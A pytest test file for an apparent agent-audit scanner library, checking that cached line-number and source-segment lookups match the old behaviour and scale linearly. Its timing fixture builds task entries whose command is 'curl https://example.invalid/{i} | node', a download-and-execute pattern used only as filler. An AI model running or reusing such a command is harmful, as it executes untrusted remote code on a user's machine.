"""The shared line and source lookups return exactly what the per-call versions did.

`find_line_number` split the whole text into lines on every call, `agent_config`
rebuilt the prefix of every match to count its line, and `ast.get_source_segment`
split the source again for every node, so a file of N items cost N times its
size. The lookups now work from what they keep per text. The tests below hold
them to the old answers on generated text over every line break `str.splitlines`
knows, and on every fixture, and hold the timing to linear growth.
"""

from __future__ import annotations

import ast
import os
import random
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Callable

import pytest

from agent_audit_kit.scanners import _helpers
from agent_audit_kit.scanners._helpers import (
    find_line_number,
    find_line_numbers,
    line_at,
    newline_line,
    source_lines,
    source_segment,
)

FIXTURES = Path(__file__).parent / "fixtures"

# Every line break `str.splitlines` breaks at, with `\r\n` as the one that takes
# two characters.
BREAKS = ["\n", "\r", "\r\n", "\v", "\f", "\x1c", "\x1d", "\x1e", "\x85", "\u2028", "\u2029"]
_PIECES = BREAKS + ["a", "b", "ab", "ba", "aab", " ", '"', ":", "é", "日本", "\U0001f600", "x" * 7, "\t", "\x00"]


def _old_find_line_number(raw: str, key: object) -> int | None:
    """`find_line_number` as it was through 0.6.22: the reference for every check."""
    if not isinstance(key, str):
        key = str(key)
    if not key:
        return None
    for i, line in enumerate(raw.splitlines(), 1):
        if key in line:
            return i
    return None


def _old_lines_search(lines: list[str], key: str) -> int | None:
    """The same search with the text's lines split once, for the large fixture sweep."""
    if not key:
        return None
    for i, line in enumerate(lines, 1):
        if key in line:
            return i
    return None


def _old_line_at(content: str, offset: int) -> int:
    """`agent_config._line_at` as it was through 0.6.22."""
    return len((content[:offset] + "\0").splitlines())


@pytest.fixture(autouse=True)
def _fresh_lookups() -> object:
    _helpers._TEXT_LOOKUPS.clear()
    yield None
    _helpers._TEXT_LOOKUPS.clear()


def _generated_texts(seed: int, count: int, length: int) -> list[str]:
    rng = random.Random(seed)
    texts = ["", "\n", "\r\n", "a", "a\n", "a\r", "\na", "a\r\nb", "a\rb\nc"]
    for _ in range(count):
        texts.append("".join(rng.choice(_PIECES) for _ in range(rng.randint(0, length))))
    return texts


def _keys_for(text: str, rng: random.Random) -> list[object]:
    """Substrings of the text (some across a break), absent strings and odd key types."""
    keys: list[object] = ["", "a", "ab", "zz", "\r\n", "\n", "a\nb", 0, 7, None, ["a"]]
    for _ in range(25):
        if text:
            start = rng.randrange(len(text))
            keys.append(text[start : start + rng.randint(1, 6)])
    keys.extend(text.splitlines()[:5])
    keys.extend(rng.choice(_PIECES) + rng.choice(_PIECES) for _ in range(5))
    return keys


def test_find_line_number_matches_the_old_search_on_generated_text() -> None:
    rng = random.Random(1)
    for text in _generated_texts(seed=2, count=400, length=60):
        for key in _keys_for(text, rng):
            assert find_line_number(text, key) == _old_find_line_number(text, key), (text, key)


@pytest.mark.parametrize("path", ["per-key", "one-pass", "one-pass-in-small-batches"])
def test_find_line_numbers_matches_the_old_search_on_every_path(path: str, monkeypatch: pytest.MonkeyPatch) -> None:
    """The batch gives each key the line one call gives it, whichever way it searches
    (key by key, in one pass, or in many small passes with the longer keys searched
    on their own), and leaves every later single lookup with that same answer."""
    if path == "per-key":
        monkeypatch.setattr(_helpers, "_ONE_PASS_KEYS", 10**9)
    else:
        monkeypatch.setattr(_helpers, "_ONE_PASS_KEYS", -1)
        monkeypatch.setattr(_helpers, "_ONE_PASS_KEY_CHARS", 0)
    if path == "one-pass-in-small-batches":
        monkeypatch.setattr(_helpers, "_ONE_PASS_NODES", 6)
        monkeypatch.setattr(_helpers, "_ONE_PASS_LONGEST", 3)
    rng = random.Random(3)
    for text in _generated_texts(seed=4, count=300, length=80):
        _helpers._TEXT_LOOKUPS.clear()
        keys = _keys_for(text, rng)
        expected = {k if isinstance(k, str) else str(k): _old_find_line_number(text, k) for k in keys}
        assert find_line_numbers(text, keys) == expected, text
        for key in keys:
            assert find_line_number(text, key) == _old_find_line_number(text, key), (text, key)


def test_the_one_pass_search_handles_keys_built_against_it() -> None:
    """Keys that share long prefixes, end inside one another, or never occur, over
    text that keeps the automaton deep, each come out at their first offset."""
    rng = random.Random(5)
    cases = [
        ("ab" * 2000, ["ab" * 50 + "c" + str(i) for i in range(40)] + ["ab", "ba", "b" * 3]),
        ("a" * 3000 + "b", ["a" * i + "b" for i in range(1, 60)] + ["a" * 70]),
        ("".join(rng.choice("ab") for _ in range(5000)), ["".join(rng.choice("ab") for _ in range(12)) for _ in range(300)]),
        ("she sells sea shells", ["he", "she", "his", "hers", "s", "e", "sells", "shell", "ells"]),
    ]
    for text, keys in cases:
        keys = list(dict.fromkeys(keys))
        assert _helpers._first_offsets(text, keys) == [text.find(k) for k in keys]


def _fixture_texts() -> list[tuple[str, str]]:
    texts = []
    for path in sorted(FIXTURES.rglob("*")):
        if not path.is_file():
            continue
        try:
            texts.append((str(path.relative_to(FIXTURES)), path.read_text(encoding="utf-8")))
        except (UnicodeDecodeError, OSError):
            continue
    return texts


def _fixture_keys(text: str) -> list[str]:
    """Each line's words and quoted strings, the kind of key a scanner passes."""
    keys: list[str] = []
    for line in text.splitlines():
        keys.extend(line.split())
        keys.extend(line.split('"')[1::2])
    return list(dict.fromkeys(k for k in keys if k))[:400]


def test_find_line_number_and_find_line_numbers_match_on_every_fixture() -> None:
    texts = _fixture_texts()
    assert len(texts) > 1000, "the fixture tree is the equivalence corpus"
    for rel, text in texts:
        lines = text.splitlines()
        keys = _fixture_keys(text)
        expected = {key: _old_lines_search(lines, key) for key in keys}
        _helpers._TEXT_LOOKUPS.clear()
        assert {key: find_line_number(text, key) for key in keys} == expected, rel
        _helpers._TEXT_LOOKUPS.clear()
        assert find_line_numbers(text, keys) == expected, rel


def test_line_at_matches_the_old_count_at_every_offset() -> None:
    for text in _generated_texts(seed=6, count=300, length=40):
        for offset in range(len(text) + 2):
            assert line_at(text, offset) == _old_line_at(text, offset), (text, offset)


def test_newline_line_matches_the_newline_count_at_every_offset() -> None:
    for text in _generated_texts(seed=9, count=300, length=40):
        for offset in range(len(text) + 2):
            assert newline_line(text, offset) == text.count("\n", 0, offset) + 1, (text, offset)


def test_source_lines_is_splitlines() -> None:
    for text in _generated_texts(seed=7, count=200, length=40):
        assert source_lines(text) == tuple(text.splitlines())
        assert source_lines(text) is source_lines(text)


def _generated_sources(seed: int, count: int) -> list[str]:
    """Python sources whose lines end every way the parser accepts, with form
    feeds and multi-byte characters inside lines."""
    rng = random.Random(seed)
    bodies = ["x = 1", "y = 'é日本'", "def f(a,\n      b):\n    return a", "if x:\n    z = [1,\n 2]", "\f\nw = 3"]
    sources = []
    for _ in range(count):
        parts = [rng.choice(bodies) for _ in range(rng.randint(1, 8))]
        eol = rng.choice(["\n", "\r\n", "\r"])
        sources.append(eol.join(p.replace("\n", eol) for p in parts) + rng.choice(["", eol]))
    return sources


def test_source_segment_matches_get_source_segment() -> None:
    """On every Python fixture that parses and on generated sources, every node's
    segment is the one `ast.get_source_segment` cuts."""
    sources = [text for rel, text in _fixture_texts() if rel.endswith(".py")]
    sources += _generated_sources(seed=8, count=200)
    checked = 0
    for source in sources:
        try:
            tree = ast.parse(source)
        except (SyntaxError, ValueError):
            continue
        _helpers._TEXT_LOOKUPS.clear()
        for node in ast.walk(tree):
            assert source_segment(source, node) == ast.get_source_segment(source, node)
            checked += 1
    assert checked > 10_000


def test_lookups_answer_the_same_after_their_text_is_evicted() -> None:
    texts = [f"line\n{i}\nkey{i}\n" for i in range(3 * _helpers._TEXT_LOOKUPS_KEPT)]
    for _ in range(2):
        for i, text in enumerate(texts):
            assert find_line_number(text, f"key{i}") == 3
            # An equal text read again is a different object with the same answers.
            assert find_line_number("".join(list(text)), f"key{i}") == 3
    assert len(_helpers._TEXT_LOOKUPS) <= _helpers._TEXT_LOOKUPS_KEPT


def test_lookups_from_several_threads_at_once() -> None:
    """Scans can run in threads at once, and the texts they look up in share one
    memo: finding an entry and moving it to the end are two steps, and another
    thread could evict it between them (KeyError)."""
    texts = [f"line {i}\nkey here\n" * 3 for i in range(2 * _helpers._TEXT_LOOKUPS_KEPT)]
    errors: list[BaseException] = []

    def work() -> None:
        try:
            for _ in range(3_000):
                for text in texts:
                    assert find_line_number(text, "key") == 2
        except BaseException as exc:  # noqa: BLE001 - every failure is reported below
            errors.append(exc)

    interval = sys.getswitchinterval()
    sys.setswitchinterval(1e-6)
    try:
        threads = [threading.Thread(target=work) for _ in range(4)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
    finally:
        sys.setswitchinterval(interval)
    assert not errors, [f"{type(e).__name__}: {e}"[:80] for e in errors[:3]]


# ---------------------------------------------------------------------------
# Before Python 3.10, `str.find` had no linear worst case: on text made of the
# key's own characters it re-read up to a line's length at every offset. The
# search the lookups use instead returns `str.find`'s answer on every Python.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("longest", [None, 3])
def test_the_search_before_python_3_10_finds_what_str_find_finds(
    longest: int | None, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The literal-pattern search, and, for a key over the pattern limit, the
    search through only the lines long enough to hold it, return the offset
    `str.find` returns, from every start, negative and past the end included,
    and for the empty key."""
    monkeypatch.setattr(_helpers, "_LINEAR_FIND", False)
    if longest is not None:
        monkeypatch.setattr(_helpers, "_LITERAL_LONGEST", longest)
    rng = random.Random(10)
    checked = 0
    for text in _generated_texts(seed=11, count=300, length=60):
        _helpers._TEXT_LOOKUPS.clear()
        n = len(text)
        starts = sorted({-n - 2, -n - 1, -n, -n // 2, -1, 0, 1, n // 3, n // 2, n - 1, n, n + 1, n + 2})
        for key in _keys_for(text, rng):
            if not isinstance(key, str):
                continue
            for start in starts:
                assert _helpers.linear_find(text, key, start) == text.find(key, start), (text, key, start)
                checked += 1
    assert checked > 100_000


def test_only_a_key_the_automaton_would_take_is_compiled_before_python_3_10(monkeypatch: pytest.MonkeyPatch) -> None:
    """Compiling a key into a pattern costs about a microsecond and 110 to 170 bytes a
    character, so before 3.10 a key over `_ONE_PASS_LONGEST` characters is searched for
    in the lines that can hold it instead, as every key was through 0.6.22: 1 MiB labels
    compiled at 9.25 s for eight. Both sides of the limit find the same line."""
    monkeypatch.setattr(_helpers, "_LINEAR_FIND", False)
    compiled: list[int] = []
    real = _helpers._literal
    monkeypatch.setattr(_helpers, "_literal", lambda key: compiled.append(len(key)) or real(key))
    limit = _helpers._ONE_PASS_LONGEST
    for size in (limit, limit + 1):
        key = "k" * (size - 1) + "!"
        _helpers._TEXT_LOOKUPS.clear()
        assert find_line_number("x\n" * 3 + key + "\n", key) == 4
    assert compiled == [limit]


def test_a_lookup_made_while_the_memo_is_held_does_not_deadlock() -> None:
    """The memo's dict lookup hashes and compares the text, which a `str` subclass can
    do in Python, through another lookup on the same thread; a plain lock deadlocked
    there. It runs in a child with a timeout, so a deadlock cannot hold the lock here."""
    code = (
        "from agent_audit_kit.scanners import _helpers as H\n"
        "class Hostile(str):\n"
        "    def __hash__(self):\n"
        "        H.find_line_number('other text\\nkey\\n', 'key')\n"
        "        return str.__hash__(self)\n"
        "print(H.find_line_number(Hostile('x\\nkey\\n'), 'key'))\n"
    )
    root = str(Path(_helpers.__file__).resolve().parents[2])
    env = {**os.environ, "PYTHONPATH": os.pathsep.join(p for p in (root, os.environ.get("PYTHONPATH")) if p)}
    result = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True, timeout=30, env=env)
    assert result.stdout.strip() == "2", result.stderr[-500:]


@pytest.mark.parametrize("longest", [None, 3])
def test_lookups_before_python_3_10_match_the_old_search(longest: int | None, monkeypatch: pytest.MonkeyPatch) -> None:
    """`find_line_number` and every path of `find_line_numbers` give the old
    answers through that search."""
    monkeypatch.setattr(_helpers, "_LINEAR_FIND", False)
    if longest is not None:
        monkeypatch.setattr(_helpers, "_LITERAL_LONGEST", longest)
    rng = random.Random(12)
    for text in _generated_texts(seed=13, count=200, length=80):
        keys = _keys_for(text, rng)
        expected = {k if isinstance(k, str) else str(k): _old_find_line_number(text, k) for k in keys}
        for one_pass in (False, True):
            monkeypatch.setattr(_helpers, "_ONE_PASS_KEYS", -1 if one_pass else 10**9)
            monkeypatch.setattr(_helpers, "_ONE_PASS_KEY_CHARS", 0)
            monkeypatch.setattr(_helpers, "_ONE_PASS_LONGEST", 3 if one_pass else 4096)
            _helpers._TEXT_LOOKUPS.clear()
            assert find_line_numbers(text, keys) == expected, text
            _helpers._TEXT_LOOKUPS.clear()
            assert {k if isinstance(k, str) else str(k): find_line_number(text, k) for k in keys} == expected, text


# ---------------------------------------------------------------------------
# Timing: two sizes ten times apart, best of three in CPU time (the machine
# running the suite may be busy), the larger allowed 40 times the smaller plus
# a fixed slack for ten times the input, under an absolute bound. The old
# lookups needed 100 times or more.
# ---------------------------------------------------------------------------


def _seconds(run: Callable[[], object]) -> float:
    """Best of three in CPU time, each run with nothing kept from the last."""
    best = float("inf")
    for _ in range(3):
        _helpers._TEXT_LOOKUPS.clear()
        started = time.process_time()
        run()
        best = min(best, time.process_time() - started)
    return best


def _assert_linear(run: Callable[[int], object], count: int) -> None:
    t_small, t_large = _seconds(lambda: run(count)), _seconds(lambda: run(10 * count))
    assert t_large < 5.0
    assert t_large < 40 * t_small + 0.25, (t_small, t_large)


def _tasks(k: int) -> tuple[str, list[str]]:
    lines = [f'    {{"label": "t{i}", "command": "curl https://example.invalid/{i} | node"}},' for i in range(k)]
    return '{\n  "tasks": [\n' + "\n".join(lines) + "\n  ]\n}\n", [f"t{i}" for i in range(k)]


def test_one_key_per_item_through_one_text_is_linear_once_looked_up_together() -> None:
    """Each item's own key first occurs at the item, so N separate searches read
    N times half the text; looked up together they read it once."""

    def run(k: int) -> None:
        text, keys = _tasks(k)
        find_line_numbers(text, keys)
        for key in keys:
            find_line_number(text, key)

    _assert_linear(run, 2_000)


def test_lines_of_many_offsets_are_linear() -> None:
    def run(k: int) -> None:
        text = "see https://x.example/\n" * k
        for offset in range(0, len(text), 23):
            line_at(text, offset)

    _assert_linear(run, 3_000)


def test_source_of_many_functions_is_linear() -> None:
    def run(k: int) -> None:
        text = "".join(f"def f{i}(a):\n    return a\n" for i in range(k))
        for node in ast.parse(text).body:
            source_segment(text, node)
            "\n".join(source_lines(text)[node.lineno - 1 : node.end_lineno])

    _assert_linear(run, 1_000)


def _keys_longer_than_lines(k: int, width: int, lines: int = 125) -> tuple[str, list[str]]:
    """`k` keys of `width + 97` characters after `lines` lines of `width` `a`s.

    Each key is one `b` among `a`s and longer than every line before it. A search
    line by line fails each of those lines on its length at once; a search of the
    whole text that re-reads a line from every offset in it does not.
    """
    keys = ["a" * (width + 95 - i) + "b" + "a" * (1 + i) for i in range(k)]
    return ("a" * width + "\n") * lines + "\n".join(keys), keys


def test_keys_longer_than_every_line_are_found_in_linear_time() -> None:
    """On Python 3.9 a whole-text `str.find` took 1.5 s for ten such keys after 125
    lines of 4,000 `a`s, where the old search line by line took no time at all."""

    def run(width: int) -> None:
        text, keys = _keys_longer_than_lines(10, width)
        for key in keys:
            find_line_number(text, key)
        _helpers._TEXT_LOOKUPS.clear()
        find_line_numbers(text, keys)

    _assert_linear(run, 800)


def test_keys_over_the_one_pass_limit_are_found_in_linear_time(monkeypatch: pytest.MonkeyPatch) -> None:
    """In a one-pass search a key over `_ONE_PASS_LONGEST` characters is searched
    for on its own, beside the pass that finds the shorter keys."""
    monkeypatch.setattr(_helpers, "_ONE_PASS_KEYS", -1)
    monkeypatch.setattr(_helpers, "_ONE_PASS_KEY_CHARS", 0)

    def run(width: int) -> None:
        text, keys = _keys_longer_than_lines(8, width, lines=12)
        _helpers.first_offsets(text, keys + [f"k{i}" for i in range(50)])

    _assert_linear(run, 4_100)


def test_keys_over_the_one_pass_limit_are_not_compiled() -> None:
    """Eight keys of 1 MiB, each on a line of its own. Before Python 3.10 each was
    compiled into a pattern before its search, at about a microsecond and 140 bytes a
    character, which took seconds and a few hundred MB; it is searched for in the
    lines that can hold it instead, here only its own."""
    keys = [f"k{i}-" + "a" * ((1 << 20) - 4) for i in range(8)]
    text = "\n".join(keys) + "\n"
    assert find_line_numbers(text, keys) == {key: n for n, key in enumerate(keys, 1)}
    assert _seconds(lambda: find_line_numbers(text, keys)) < 5.0


def test_a_key_over_the_pattern_limit_reads_only_lines_that_can_hold_it(monkeypatch: pytest.MonkeyPatch) -> None:
    """Before Python 3.10 a key over `_LITERAL_LONGEST` characters is not compiled,
    which costs about 140 bytes a character; it is searched for in the lines at
    least as long as itself, as before 0.6.23, so every shorter line is skipped."""
    monkeypatch.setattr(_helpers, "_LINEAR_FIND", False)
    monkeypatch.setattr(_helpers, "_LITERAL_LONGEST", 64)

    def run(width: int) -> None:
        text, keys = _keys_longer_than_lines(10, width)
        for key in keys:
            find_line_number(text, key)

    _assert_linear(run, 800)
